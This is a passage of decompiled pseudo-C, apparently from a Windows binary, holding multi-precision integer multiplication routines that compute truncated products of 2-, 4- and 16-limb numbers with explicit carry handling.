  v133 = *a2 * (unsigned __int128)a3[8];
  v134 = v131 + v133;
  *((_QWORD *)&v133 + 1) += v131 + (unsigned __int64)v133 < v131;
  v135 = *((_QWORD *)&v133 + 1) + v132;
  v136 = v135 < *((_QWORD *)&v133 + 1);
  v137 = a2[1] * (unsigned __int128)a3[7];
  v138 = v134 + v137;
  *((_QWORD *)&v137 + 1) += v134 + (unsigned __int64)v137 < v134;
  v139 = *((_QWORD *)&v137 + 1) + v135;
  v140 = (v139 < *((_QWORD *)&v137 + 1)) + v136;
  v141 = a2[2] * (unsigned __int128)a3[6];
  v142 = v138 + v141;
  *((_QWORD *)&v141 + 1) += v138 + (unsigned __int64)v141 < v138;
  v143 = *((_QWORD *)&v141 + 1) + v139;
  v144 = (v143 < *((_QWORD *)&v141 + 1)) + v140;
  v145 = a2[3] * (unsigned __int128)a3[5];
  v146 = v142 + v145;
  *((_QWORD *)&v145 + 1) += v142 + (unsigned __int64)v145 < v142;
  v147 = *((_QWORD *)&v145 + 1) + v143;
  v148 = (v147 < *((_QWORD *)&v145 + 1)) + v144;
  v149 = a2[4] * (unsigned __int128)a3[4];
  v150 = v146 + v149;
  *((_QWORD *)&v149 + 1) += v146 + (unsigned __int64)v149 < v146;
  v151 = *((_QWORD *)&v149 + 1) + v147;
  v152 = (v151 < *((_QWORD *)&v149 + 1)) + v148;
  v153 = a2[5] * (unsigned __int128)a3[3];
  v154 = v150 + v153;
  *((_QWORD *)&v153 + 1) += v150 + (unsigned __int64)v153 < v150;
  v155 = *((_QWORD *)&v153 + 1) + v151;
  v156 = (v155 < *((_QWORD *)&v153 + 1)) + v152;
  v157 = a2[6] * (unsigned __int128)a3[2];
  v158 = v154 + v157;
  *((_QWORD *)&v157 + 1) += v154 + (unsigned __int64)v157 < v154;
  v159 = *((_QWORD *)&v157 + 1) + v155;
  v160 = (v159 < *((_QWORD *)&v157 + 1)) + v156;
  v161 = a2[7] * (unsigned __int128)a3[1];
  v162 = v158 + v161;
  *((_QWORD *)&v161 + 1) += v158 + (unsigned __int64)v161 < v158;
  v163 = *((_QWORD *)&v161 + 1) + v159;
  v164 = (v163 < *((_QWORD *)&v161 + 1)) + v160;
  v165 = a2[8] * (unsigned __int128)*a3;
  *(_QWORD *)&v165 = v162 + v165;
  a1[8] = v165;
  *((_QWORD *)&v165 + 1) += (unsigned __int64)v165 < v162;
  v166 = *((_QWORD *)&v165 + 1) + v163;
  v167 = (v166 < *((_QWORD *)&v165 + 1)) + v164;
  v168 = *a2 * (unsigned __int128)a3[9];
  v169 = v166 + v168;
  *((_QWORD *)&v168 + 1) += v166 + (unsigned __int64)v168 < v166;
  v170 = *((_QWORD *)&v168 + 1) + v167;
  v171 = v170 < *((_QWORD *)&v168 + 1);
  v172 = a2[1] * (unsigned __int128)a3[8];
  v173 = v169 + v172;
  *((_QWORD *)&v172 + 1) += v169 + (unsigned __int64)v172 < v169;
  v174 = *((_QWORD *)&v172 + 1) + v170;
  v175 = (v174 < *((_QWORD *)&v172 + 1)) + v171;
  v176 = a2[2] * (unsigned __int128)a3[7];
  v177 = v173 + v176;
  *((_QWORD *)&v176 + 1) += v173 + (unsigned __int64)v176 < v173;
  v178 = *((_QWORD *)&v176 + 1) + v174;
  v179 = (v178 < *((_QWORD *)&v176 + 1)) + v175;
  v180 = a2[3] * (unsigned __int128)a3[6];
  v181 = v177 + v180;
  *((_QWORD *)&v180 + 1) += v177 + (unsigned __int64)v180 < v177;
  v182 = *((_QWORD *)&v180 + 1) + v178;
  v183 = (v182 < *((_QWORD *)&v180 + 1)) + v179;
  v184 = a2[4] * (unsigned __int128)a3[5];
  v185 = v181 + v184;
  *((_QWORD *)&v184 + 1) += v181 + (unsigned __int64)v184 < v181;
  v186 = *((_QWORD *)&v184 + 1) + v182;
  v187 = (v186 < *((_QWORD *)&v184 + 1)) + v183;
  v188 = a2[5] * (unsigned __int128)a3[4];
  v189 = v185 + v188;
  *((_QWORD *)&v188 + 1) += v185 + (unsigned __int64)v188 < v185;
  v190 = *((_QWORD *)&v188 + 1) + v186;
  v191 = (v190 < *((_QWORD *)&v188 + 1)) + v187;
  v192 = a2[6] * (unsigned __int128)a3[3];
  v193 = v189 + v192;
  *((_QWORD *)&v192 + 1) += v189 + (unsigned __int64)v192 < v189;
  v194 = *((_QWORD *)&v192 + 1) + v190;
  v195 = (v194 < *((_QWORD *)&v192 + 1)) + v191;
  v196 = a2[7] * (unsigned __int128)a3[2];
  v197 = v193 + v196;
  *((_QWORD *)&v196 + 1) += v193 + (unsigned __int64)v196 < v193;
  v198 = *((_QWORD *)&v196 + 1) + v194;
  v199 = (v198 < *((_QWORD *)&v196 + 1)) + v195;
  v200 = a2[8] * (unsigned __int128)a3[1];
  v201 = v197 + v200;
  *((_QWORD *)&v200 + 1) += v197 + (unsigned __int64)v200 < v197;
  v202 = *((_QWORD *)&v200 + 1) + v198;
  v203 = (v202 < *((_QWORD *)&v200 + 1)) + v199;
  v204 = a2[9] * (unsigned __int128)*a3;
  *(_QWORD *)&v204 = v201 + v204;
  a1[9] = v204;
  *((_QWORD *)&v204 + 1) += (unsigned __int64)v204 < v201;
  v205 = *((_QWORD *)&v204 + 1) + v202;
  v206 = (v205 < *((_QWORD *)&v204 + 1)) + v203;
  v207 = *a2 * (unsigned __int128)a3[10];
  v208 = v205 + v207;
  *((_QWORD *)&v207 + 1) += v205 + (unsigned __int64)v207 < v205;
  v209 = *((_QWORD *)&v207 + 1) + v206;
  v210 = v209 < *((_QWORD *)&v207 + 1);
  v211 = a2[1] * (unsigned __int128)a3[9];
  v212 = v208 + v211;
  *((_QWORD *)&v211 + 1) += v208 + (unsigned __int64)v211 < v208;
  v213 = *((_QWORD *)&v211 + 1) + v209;
  v214 = (v213 < *((_QWORD *)&v211 + 1)) + v210;
  v215 = a2[2] * (unsigned __int128)a3[8];
  v216 = v212 + v215;
  *((_QWORD *)&v215 + 1) += v212 + (unsigned __int64)v215 < v212;
  v217 = *((_QWORD *)&v215 + 1) + v213;
  v218 = (v217 < *((_QWORD *)&v215 + 1)) + v214;
  v219 = a2[3] * (unsigned __int128)a3[7];
  v220 = v216 + v219;
  *((_QWORD *)&v219 + 1) += v216 + (unsigned __int64)v219 < v216;
  v221 = *((_QWORD *)&v219 + 1) + v217;
  v222 = (v221 < *((_QWORD *)&v219 + 1)) + v218;
  v223 = a2[4] * (unsigned __int128)a3[6];
  v224 = v220 + v223;
  *((_QWORD *)&v223 + 1) += v220 + (unsigned __int64)v223 < v220;
  v225 = *((_QWORD *)&v223 + 1) + v221;
  v226 = (v225 < *((_QWORD *)&v223 + 1)) + v222;
  v227 = a2[5] * (unsigned __int128)a3[5];
  v228 = v224 + v227;
  *((_QWORD *)&v227 + 1) += v224 + (unsigned __int64)v227 < v224;
  v229 = *((_QWORD *)&v227 + 1) + v225;
  v230 = (v229 < *((_QWORD *)&v227 + 1)) + v226;
  v231 = a2[6] * (unsigned __int128)a3[4];
  v232 = v228 + v231;
  *((_QWORD *)&v231 + 1) += v228 + (unsigned __int64)v231 < v228;
  v233 = *((_QWORD *)&v231 + 1) + v229;
  v234 = (v233 < *((_QWORD *)&v231 + 1)) + v230;
  v235 = a2[7] * (unsigned __int128)a3[3];
  v236 = v232 + v235;
  *((_QWORD *)&v235 + 1) += v232 + (unsigned __int64)v235 < v232;
  v237 = *((_QWORD *)&v235 + 1) + v233;
  v238 = (v237 < *((_QWORD *)&v235 + 1)) + v234;
  v239 = a2[8] * (unsigned __int128)a3[2];
  v240 = v236 + v239;
  *((_QWORD *)&v239 + 1) += v236 + (unsigned __int64)v239 < v236;
  v241 = *((_QWORD *)&v239 + 1) + v237;
  v242 = (v241 < *((_QWORD *)&v239 + 1)) + v238;
  v243 = a2[9] * (unsigned __int128)a3[1];
  v244 = v240 + v243;
  *((_QWORD *)&v243 + 1) += v240 + (unsigned __int64)v243 < v240;
  v245 = *((_QWORD *)&v243 + 1) + v241;
  v246 = (v245 < *((_QWORD *)&v243 + 1)) + v242;
  v247 = a2[10] * (unsigned __int128)*a3;
  *(_QWORD *)&v247 = v244 + v247;
  a1[10] = v247;
  *((_QWORD *)&v247 + 1) += (unsigned __int64)v247 < v244;
  v248 = *((_QWORD *)&v247 + 1) + v245;
  v249 = (v248 < *((_QWORD *)&v247 + 1)) + v246;
  v250 = *a2 * (unsigned __int128)a3[11];
  v251 = v248 + v250;
  *((_QWORD *)&v250 + 1) += v248 + (unsigned __int64)v250 < v248;
  v252 = *((_QWORD *)&v250 + 1) + v249;
  v253 = v252 < *((_QWORD *)&v250 + 1);
  v254 = a2[1] * (unsigned __int128)a3[10];
  v255 = v251 + v254;
  *((_QWORD *)&v254 + 1) += v251 + (unsigned __int64)v254 < v251;
  v256 = *((_QWORD *)&v254 + 1) + v252;
  v257 = (v256 < *((_QWORD *)&v254 + 1)) + v253;
  v258 = a2[2] * (unsigned __int128)a3[9];
  v259 = v255 + v258;
  *((_QWORD *)&v258 + 1) += v255 + (unsigned __int64)v258 < v255;
  v260 = *((_QWORD *)&v258 + 1) + v256;
  v261 = (v260 < *((_QWORD *)&v258 + 1)) + v257;
  v262 = a2[3] * (unsigned __int128)a3[8];
  v263 = v259 + v262;
  *((_QWORD *)&v262 + 1) += v259 + (unsigned __int64)v262 < v259;
  v264 = *((_QWORD *)&v262 + 1) + v260;
  v265 = (v264 < *((_QWORD *)&v262 + 1)) + v261;
  v266 = a2[4] * (unsigned __int128)a3[7];
  v267 = v263 + v266;
  *((_QWORD *)&v266 + 1) += v263 + (unsigned __int64)v266 < v263;
  v268 = *((_QWORD *)&v266 + 1) + v264;
  v269 = (v268 < *((_QWORD *)&v266 + 1)) + v265;
  v270 = a2[5] * (unsigned __int128)a3[6];
  v271 = v267 + v270;
  *((_QWORD *)&v270 + 1) += v267 + (unsigned __int64)v270 < v267;
  v272 = *((_QWORD *)&v270 + 1) + v268;
  v273 = (v272 < *((_QWORD *)&v270 + 1)) + v269;
  v274 = a2[6] * (unsigned __int128)a3[5];
  v275 = v271 + v274;
  *((_QWORD *)&v274 + 1) += v271 + (unsigned __int64)v274 < v271;
  v276 = *((_QWORD *)&v274 + 1) + v272;
  v277 = (v276 < *((_QWORD *)&v274 + 1)) + v273;
  v278 = a2[7] * (unsigned __int128)a3[4];
  v279 = v275 + v278;
  *((_QWORD *)&v278 + 1) += v275 + (unsigned __int64)v278 < v275;
  v280 = *((_QWORD *)&v278 + 1) + v276;
  v281 = (v280 < *((_QWORD *)&v278 + 1)) + v277;
  v282 = a2[8] * (unsigned __int128)a3[3];
  v283 = v279 + v282;
  *((_QWORD *)&v282 + 1) += v279 + (unsigned __int64)v282 < v279;
  v284 = *((_QWORD *)&v282 + 1) + v280;
  v285 = (v284 < *((_QWORD *)&v282 + 1)) + v281;
  v286 = a2[9] * (unsigned __int128)a3[2];
  v287 = v283 + v286;
  *((_QWORD *)&v286 + 1) += v283 + (unsigned __int64)v286 < v283;
  v288 = *((_QWORD *)&v286 + 1) + v284;
  v289 = (v288 < *((_QWORD *)&v286 + 1)) + v285;
  v290 = a2[10] * (unsigned __int128)a3[1];
  v291 = v287 + v290;
  *((_QWORD *)&v290 + 1) += v287 + (unsigned __int64)v290 < v287;
  v292 = *((_QWORD *)&v290 + 1) + v288;
  v293 = (v292 < *((_QWORD *)&v290 + 1)) + v289;
  v294 = a2[11] * (unsigned __int128)*a3;
  *(_QWORD *)&v294 = v291 + v294;
  *((_QWORD *)&v294 + 1) += (unsigned __int64)v294 < v291;
  v295 = *((_QWORD *)&v294 + 1) + v292;
  a1[11] = v294;
  v296 = (v295 < *((_QWORD *)&v294 + 1)) + v293;
  v297 = *a2 * (unsigned __int128)a3[12];
  v298 = v295 + v297;
  *((_QWORD *)&v297 + 1) += v295 + (unsigned __int64)v297 < v295;
  v299 = *((_QWORD *)&v297 + 1) + v296;
  v300 = v299 < *((_QWORD *)&v297 + 1);
  v301 = a2[1] * (unsigned __int128)a3[11];
  v302 = v298 + v301;
  *((_QWORD *)&v301 + 1) += v298 + (unsigned __int64)v301 < v298;
  v303 = *((_QWORD *)&v301 + 1) + v299;
  v304 = (v303 < *((_QWORD *)&v301 + 1)) + v300;
  v305 = a2[2] * (unsigned __int128)a3[10];
  v306 = v302 + v305;
  *((_QWORD *)&v305 + 1) += v302 + (unsigned __int64)v305 < v302;
  v307 = *((_QWORD *)&v305 + 1) + v303;
  v308 = (v307 < *((_QWORD *)&v305 + 1)) + v304;
  v309 = a2[3] * (unsigned __int128)a3[9];
  v310 = v306 + v309;
  *((_QWORD *)&v309 + 1) += v306 + (unsigned __int64)v309 < v306;
  v311 = *((_QWORD *)&v309 + 1) + v307;
  v312 = (v311 < *((_QWORD *)&v309 + 1)) + v308;
  v313 = a2[4] * (unsigned __int128)a3[8];
  v314 = v310 + v313;
  *((_QWORD *)&v313 + 1) += v310 + (unsigned __int64)v313 < v310;
  v315 = *((_QWORD *)&v313 + 1) + v311;
  v316 = (v315 < *((_QWORD *)&v313 + 1)) + v312;
  v317 = a2[5] * (unsigned __int128)a3[7];
  v318 = v314 + v317;
  *((_QWORD *)&v317 + 1) += v314 + (unsigned __int64)v317 < v314;
  v319 = *((_QWORD *)&v317 + 1) + v315;
  v320 = (v319 < *((_QWORD *)&v317 + 1)) + v316;
  v321 = a2[6] * (unsigned __int128)a3[6];
  v322 = v318 + v321;
  *((_QWORD *)&v321 + 1) += v318 + (unsigned __int64)v321 < v318;
  v323 = *((_QWORD *)&v321 + 1) + v319;
  v324 = (v323 < *((_QWORD *)&v321 + 1)) + v320;
  v325 = a2[7] * (unsigned __int128)a3[5];
  v326 = v322 + v325;
  *((_QWORD *)&v325 + 1) += v322 + (unsigned __int64)v325 < v322;
  v327 = *((_QWORD *)&v325 + 1) + v323;
  v328 = (v327 < *((_QWORD *)&v325 + 1)) + v324;
  v329 = a2[8] * (unsigned __int128)a3[4];
  v330 = v326 + v329;
  *((_QWORD *)&v329 + 1) += v326 + (unsigned __int64)v329 < v326;
  v331 = *((_QWORD *)&v329 + 1) + v327;
  v332 = (v331 < *((_QWORD *)&v329 + 1)) + v328;
  v333 = a2[9] * (unsigned __int128)a3[3];
  v334 = v330 + v333;
  *((_QWORD *)&v333 + 1) += v330 + (unsigned __int64)v333 < v330;
  v335 = *((_QWORD *)&v333 + 1) + v331;
  v336 = (v335 < *((_QWORD *)&v333 + 1)) + v332;
  v337 = a2[10] * (unsigned __int128)a3[2];
  v338 = v334 + v337;
  *((_QWORD *)&v337 + 1) += v334 + (unsigned __int64)v337 < v334;
  v339 = *((_QWORD *)&v337 + 1) + v335;
  v340 = (v339 < *((_QWORD *)&v337 + 1)) + v336;
  v341 = a2[11] * (unsigned __int128)a3[1];
  v342 = v338 + v341;
  *((_QWORD *)&v341 + 1) += v338 + (unsigned __int64)v341 < v338;
  v343 = *((_QWORD *)&v341 + 1) + v339;
  v344 = (v343 < *((_QWORD *)&v341 + 1)) + v340;
  v345 = a2[12] * (unsigned __int128)*a3;
  *(_QWORD *)&v345 = v342 + v345;
  a1[12] = v345;
  *((_QWORD *)&v345 + 1) += (unsigned __int64)v345 < v342;
  v346 = *((_QWORD *)&v345 + 1) + v343;
  v347 = (v346 < *((_QWORD *)&v345 + 1)) + v344;
  v348 = *a2 * (unsigned __int128)a3[13];
  v349 = v346 + v348;
  *((_QWORD *)&v348 + 1) += v346 + (unsigned __int64)v348 < v346;
  v350 = *((_QWORD *)&v348 + 1) + v347;
  v351 = v350 < *((_QWORD *)&v348 + 1);
  v352 = a2[1] * (unsigned __int128)a3[12];
  v353 = v349 + v352;
  *((_QWORD *)&v352 + 1) += v349 + (unsigned __int64)v352 < v349;
  v354 = *((_QWORD *)&v352 + 1) + v350;
  v355 = (v354 < *((_QWORD *)&v352 + 1)) + v351;
  v356 = a2[2] * (unsigned __int128)a3[11];
  v357 = v353 + v356;
  *((_QWORD *)&v356 + 1) += v353 + (unsigned __int64)v356 < v353;
  v358 = *((_QWORD *)&v356 + 1) + v354;
  v359 = (v358 < *((_QWORD *)&v356 + 1)) + v355;
  v360 = a2[3] * (unsigned __int128)a3[10];
  v361 = v357 + v360;
  *((_QWORD *)&v360 + 1) += v357 + (unsigned __int64)v360 < v357;
  v362 = *((_QWORD *)&v360 + 1) + v358;
  v363 = (v362 < *((_QWORD *)&v360 + 1)) + v359;
  v364 = a2[4] * (unsigned __int128)a3[9];
  v365 = v361 + v364;
  *((_QWORD *)&v364 + 1) += v361 + (unsigned __int64)v364 < v361;
  v366 = *((_QWORD *)&v364 + 1) + v362;
  v367 = (v366 < *((_QWORD *)&v364 + 1)) + v363;
  v368 = a2[5] * (unsigned __int128)a3[8];
  v369 = v365 + v368;
  *((_QWORD *)&v368 + 1) += v365 + (unsigned __int64)v368 < v365;
  v370 = *((_QWORD *)&v368 + 1) + v366;
  v371 = (v370 < *((_QWORD *)&v368 + 1)) + v367;
  v372 = a2[6] * (unsigned __int128)a3[7];
  v373 = v369 + v372;
  *((_QWORD *)&v372 + 1) += v369 + (unsigned __int64)v372 < v369;
  v374 = *((_QWORD *)&v372 + 1) + v370;
  v375 = (v374 < *((_QWORD *)&v372 + 1)) + v371;
  v376 = a2[7] * (unsigned __int128)a3[6];
  v377 = v373 + v376;
  *((_QWORD *)&v376 + 1) += v373 + (unsigned __int64)v376 < v373;
  v378 = *((_QWORD *)&v376 + 1) + v374;
  v379 = (v378 < *((_QWORD *)&v376 + 1)) + v375;
  v380 = a2[8] * (unsigned __int128)a3[5];
  v381 = v377 + v380;
  *((_QWORD *)&v380 + 1) += v377 + (unsigned __int64)v380 < v377;
  v382 = *((_QWORD *)&v380 + 1) + v378;
  v383 = (v382 < *((_QWORD *)&v380 + 1)) + v379;
  v384 = a2[9] * (unsigned __int128)a3[4];
  v385 = v381 + v384;
  *((_QWORD *)&v384 + 1) += v381 + (unsigned __int64)v384 < v381;
  v386 = *((_QWORD *)&v384 + 1) + v382;
  v387 = (v386 < *((_QWORD *)&v384 + 1)) + v383;
  v388 = a2[10] * (unsigned __int128)a3[3];
  v389 = v385 + v388;
  *((_QWORD *)&v388 + 1) += v385 + (unsigned __int64)v388 < v385;
  v390 = *((_QWORD *)&v388 + 1) + v386;
  v391 = (v390 < *((_QWORD *)&v388 + 1)) + v387;
  v392 = a2[11] * (unsigned __int128)a3[2];
  v393 = v389 + v392;
  *((_QWORD *)&v392 + 1) += v389 + (unsigned __int64)v392 < v389;
  v394 = *((_QWORD *)&v392 + 1) + v390;
  v395 = (v394 < *((_QWORD *)&v392 + 1)) + v391;
  v396 = a2[12] * (unsigned __int128)a3[1];
  v397 = v393 + v396;
  *((_QWORD *)&v396 + 1) += v393 + (unsigned __int64)v396 < v393;
  v398 = *((_QWORD *)&v396 + 1) + v394;
  v399 = (v398 < *((_QWORD *)&v396 + 1)) + v395;
  v400 = a2[13] * (unsigned __int128)*a3;
  *(_QWORD *)&v400 = v397 + v400;
  a1[13] = v400;
  *((_QWORD *)&v400 + 1) += (unsigned __int64)v400 < v397;
  v401 = *((_QWORD *)&v400 + 1) + v398;
  v402 = (v401 < *((_QWORD *)&v400 + 1)) + v399;
  v403 = *a2 * (unsigned __int128)a3[14];
  v404 = v401 + v403;
  v405 = (v401 + (unsigned __int64)v403 < v401) + *((_QWORD *)&v403 + 1) + v402;
  v406 = a2[1] * (unsigned __int128)a3[13];
  v407 = v404 + v406;
  v408 = (v404 + (unsigned __int64)v406 < v404) + *((_QWORD *)&v406 + 1) + v405;
  v409 = a2[2] * (unsigned __int128)a3[12];
  v410 = v407 + v409;
  v411 = (v407 + (unsigned __int64)v409 < v407) + *((_QWORD *)&v409 + 1) + v408;
  v412 = a2[3] * (unsigned __int128)a3[11];
  v413 = v410 + v412;
  v414 = (v410 + (unsigned __int64)v412 < v410) + *((_QWORD *)&v412 + 1) + v411;
  v415 = a2[4] * (unsigned __int128)a3[10];
  v416 = v413 + v415;
  v417 = (v413 + (unsigned __int64)v415 < v413) + *((_QWORD *)&v415 + 1) + v414;
  v418 = a2[5] * (unsigned __int128)a3[9];
  v419 = v416 + v418;
  v420 = (v416 + (unsigned __int64)v418 < v416) + *((_QWORD *)&v418 + 1) + v417;
  v421 = a2[6] * (unsigned __int128)a3[8];
  v422 = v419 + v421;
  v423 = (v419 + (unsigned __int64)v421 < v419) + *((_QWORD *)&v421 + 1) + v420;
  v424 = a2[7] * (unsigned __int128)a3[7];
  v425 = v422 + v424;
  v426 = (v422 + (unsigned __int64)v424 < v422) + *((_QWORD *)&v424 + 1) + v423;
  v427 = a2[8] * (unsigned __int128)a3[6];
  v428 = v425 + v427;
  v429 = (v425 + (unsigned __int64)v427 < v425) + *((_QWORD *)&v427 + 1) + v426;
  v430 = a2[9] * (unsigned __int128)a3[5];
  v431 = v428 + v430;
  v432 = (v428 + (unsigned __int64)v430 < v428) + *((_QWORD *)&v430 + 1) + v429;
  v433 = a2[10] * (unsigned __int128)a3[4];
  v434 = v431 + v433;
  v435 = (v431 + (unsigned __int64)v433 < v431) + *((_QWORD *)&v433 + 1) + v432;
  v436 = a2[11] * (unsigned __int128)a3[3];
  v437 = v434 + v436;
  v438 = (v434 + (unsigned __int64)v436 < v434) + *((_QWORD *)&v436 + 1) + v435;
  v439 = a2[12] * (unsigned __int128)a3[2];
  v440 = v437 + v439;
  v441 = (v437 + (unsigned __int64)v439 < v437) + *((_QWORD *)&v439 + 1) + v438;
  v442 = a2[13] * (unsigned __int128)a3[1];
  v443 = v440 + v442;
  v444 = (v440 + (unsigned __int64)v442 < v440) + *((_QWORD *)&v442 + 1) + v441;
  v445 = a2[14] * (unsigned __int128)*a3;
  *(_QWORD *)&v445 = v443 + v445;
  a1[14] = v445;
  result = ((unsigned __int64)v445 < v443)
         + *((_QWORD *)&v445 + 1)
         + a2[7] * a3[8]
         + a2[13] * a3[2]
         + a2[9] * a3[6]
         + a3[4] * a2[11]
         + a2[1] * a3[14]
         + a2[3] * a3[12]
         + a3[11] * a2[4]
         + a3[9] * a2[6]
         + a3[7] * a2[8]
         + a3[1] * a2[14]
         + a3[3] * a2[12]
         + a3[5] * a2[10]
         + *a3 * a2[15]
         + *a2 * a3[15]
         + v444
         + a2[5] * a3[10]
         + a2[2] * a3[13];
  a1[15] = result;
  return result;
}
// 13F117C30: too many cbuild loops

//----- (000000013F118A90) ----------------------------------------------------
__int64 __fastcall sub_13F118A90(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  unsigned __int64 v3; // kr00_8
  __int128 v4; // kr10_16
  __int64 result; // rax

  v3 = *a3;
  v4 = *a2;
  *a1 = *a2 * *a3;
  result = (__PAIR128__(a3[1], v3) * v4) >> 64;
  a1[1] = result + *a3 * a2[1];
  return result;
}

//----- (000000013F118AC0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F118AC0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  __int128 v6; // kr00_16
  __int128 v7; // kr10_16
  __int64 v8; // r11
  unsigned __int64 v9; // r8
  unsigned __int64 v10; // rax
  __int64 v11; // rdi
  unsigned __int64 v12; // rdi
  unsigned __int64 v13; // r11
  unsigned __int64 v14; // rcx
  __int64 v15; // rbx
  unsigned __int64 v16; // r9
  __int64 v17; // r10
  unsigned __int128 v18; // rax
  unsigned __int64 result; // rax

  v6 = *a3;
  v7 = *a2;
  *a1 = *a2 * *a3;
  v8 = (*a2 * (unsigned __int128)a3[1]) >> 64;
  v9 = (__PAIR128__(a3[1], v6) * v7) >> 64;
  v10 = v9 + a2[1] * *a3;
  v11 = (a2[1] * (unsigned __int128)*a3) >> 64;
  a1[1] = v10;
  v12 = (v10 < v9) + v11;
  v13 = v12 + (v9 < (unsigned __int128)(v7 * v6) >> 64) + v8;
  v14 = v13 + a2[2] * *a3;
  v15 = (v14 < v13) + ((a2[2] * (unsigned __int128)*a3) >> 64);
  v16 = v14 + a2[1] * a3[1];
  v17 = (v16 < v14) + ((a2[1] * (unsigned __int128)a3[1]) >> 64);
  v18 = *a2 * (unsigned __int128)a3[2];
  *(_QWORD *)&v18 = v16 + v18;
  a1[2] = v18;
  result = ((unsigned __int64)v18 < v16) + *a3 * a2[3] + (v13 < v12) + *a2 * a3[3] + v15 + a2[2] * a3[1];
  a1[3] = *((_QWORD *)&v18 + 1) + v17 + result + a3[2] * a2[1];
  return result;
}

//----- (000000013F118BB0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F118BB0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  __int128 v6; // kr00_16
  __int128 v7; // kr10_16
  __int64 v8; // rcx
  unsigned __int64 v9; // r8
  unsigned __int64 v10; // rax
  __int64 v11; // r9
  unsigned __int64 v12; // r9
  unsigned __int64 v13; // rcx
  unsigned __int64 v14; // r8
  unsigned __int64 v15; // rdi
  unsigned __int64 v16; // rbx
  unsigned __int64 v17; // rcx
  unsigned __int64 v18; // r11
  unsigned __int64 v19; // rax
  __int64 v20; // r9
  unsigned __int64 v21; // r9
  unsigned __int64 v22; // rcx
  unsigned __int64 v23; // r8
  unsigned __int64 v24; // r14
  unsigned __int64 v25; // rbp
  unsigned __int64 v26; // rcx
  unsigned __int64 v27; // rsi
  unsigned __int64 v28; // r8
  unsigned __int64 v29; // rbx
  unsigned __int64 v30; // r10
  unsigned __int64 v31; // rax
  unsigned __int64 v32; // r9
  unsigned __int128 v33; // rax
  unsigned __int64 v34; // r11
  unsigned __int64 v35; // r8
  _BOOL8 v36; // r10
  unsigned __int128 v37; // rax
  unsigned __int64 v38; // r9
  unsigned __int64 v39; // rcx
  _BOOL8 v40; // r10
  unsigned __int128 v41; // rax
  unsigned __int64 v42; // r8
  unsigned __int64 v43; // r9
  _BOOL8 v44; // r10
  unsigned __int128 v45; // rax
  unsigned __int64 v46; // rcx
  unsigned __int64 v47; // r9
  _BOOL8 v48; // r10
  unsigned __int128 v49; // rax
  unsigned __int64 v50; // r9
  _BOOL8 v51; // r10
  unsigned __int128 v52; // rax
  unsigned __int64 v53; // rcx
  unsigned __int64 v54; // r10
  _BOOL8 v55; // r15
  unsigned __int128 v56; // rax
  unsigned __int64 v57; // r8
  unsigned __int64 v58; // r10
  _BOOL8 v59; // r15
  unsigned __int128 v60; // rax
  unsigned __int64 v61; // rcx
  unsigned __int64 v62; // r10
  _BOOL8 v63; // r15
  unsigned __int128 v64; // rax
  unsigned __int64 v65; // r8
  unsigned __int64 v66; // r10
  _BOOL8 v67; // r15
  unsigned __int128 v68; // rax
  unsigned __int64 v69; // rcx
  unsigned __int64 v70; // r10
  _BOOL8 v71; // r15
  unsigned __int128 v72; // rax
  unsigned __int64 v73; // r10
  _BOOL8 v74; // r15
  unsigned __int128 v75; // rax
  unsigned __int64 v76; // rcx
  __int64 v77; // r15
  unsigned __int128 v78; // rax
  unsigned __int64 v79; // r8
  __int64 v80; // r15
  unsigned __int128 v81; // rax
  unsigned __int64 v82; // rcx
  __int64 v83; // r15
  unsigned __int128 v84; // rax
  unsigned __int64 v85; // r8
  __int64 v86; // r15
  unsigned __int128 v87; // rax
  unsigned __int64 v88; // rcx
  __int64 v89; // r15
  unsigned __int128 v90; // rax
  unsigned __int64 v91; // r8
  __int64 v92; // r15
  unsigned __int128 v93; // rax
  unsigned __int64 result; // rax

  v6 = *a3;
  v7 = *a2;
  *a1 = *a2 * *a3;
  v8 = (*a2 * (unsigned __int128)a3[1]) >> 64;
  v9 = (__PAIR128__(a3[1], v6) * v7) >> 64;
  v10 = v9 + a2[1] * *a3;
  v11 = (a2[1] * (unsigned __int128)*a3) >> 64;
  a1[1] = v10;
  v12 = (v10 < v9) + v11;
  v13 = v12 + (v9 < (unsigned __int128)(v7 * v6) >> 64) + v8;
  v14 = v13 + *a2 * a3[2];
  v15 = (v14 < v13) + ((*a2 * (unsigned __int128)a3[2]) >> 64);
  v16 = (v13 < v12) + v15;
  v17 = v14 + a2[1] * a3[1];
  v18 = (v17 < v14) + ((a2[1] * (unsigned __int128)a3[1]) >> 64);
  v19 = v17 + a2[2] * *a3;
  v20 = (a2[2] * (unsigned __int128)*a3) >> 64;
  a1[2] = v19;
  v21 = (v19 < v17) + v20;
  v22 = v16 + v18 + v21;
  v23 = v22 + *a2 * a3[3];
  v24 = (v23 < v22) + ((*a2 * (unsigned __int128)a3[3]) >> 64);
  v25 = (v16 < v15) + v24 + (v22 < v21) + (unsigned __int64)(v16 + v18 < v18);
  v26 = v23 + a2[1] * a3[2];
  v27 = (v26 < v23) + ((a2[1] * (unsigned __int128)a3[2]) >> 64);
  v28 = v26 + a2[2] * a3[1];
  v29 = (v28 < v26) + ((a2[2] * (unsigned __int128)a3[1]) >> 64);
  v30 = v29 + v27 + v25;
  v31 = v28 + a2[3] * *a3;
  v32 = (v31 < v28) + ((a2[3] * (unsigned __int128)*a3) >> 64);
  a1[3] = v31;
  v33 = *a2 * (unsigned __int128)a3[4];
  v34 = v32 + v30 + v33;
  *((_QWORD *)&v33 + 1) += v34 < v32 + v30;
  v35 = (v30 < v29) + (unsigned __int64)(v27 + v25 < v27) + (v25 < v24) + (v32 + v30 < v32) + *((_QWORD *)&v33 + 1);
  v36 = v35 < *((_QWORD *)&v33 + 1);
  v37 = a2[1] * (unsigned __int128)a3[3];
  v38 = v34 + v37;
  *((_QWORD *)&v37 + 1) += v34 + (unsigned __int64)v37 < v34;
  v39 = v35 + *((_QWORD *)&v37 + 1);
  v40 = (v35 + *((_QWORD *)&v37 + 1) < *((_QWORD *)&v37 + 1)) + v36;
  v41 = a2[2] * (unsigned __int128)a3[2];
  v42 = v38 + v41;
  *((_QWORD *)&v41 + 1) += v38 + (unsigned __int64)v41 < v38;
  v43 = *((_QWORD *)&v41 + 1) + v39;
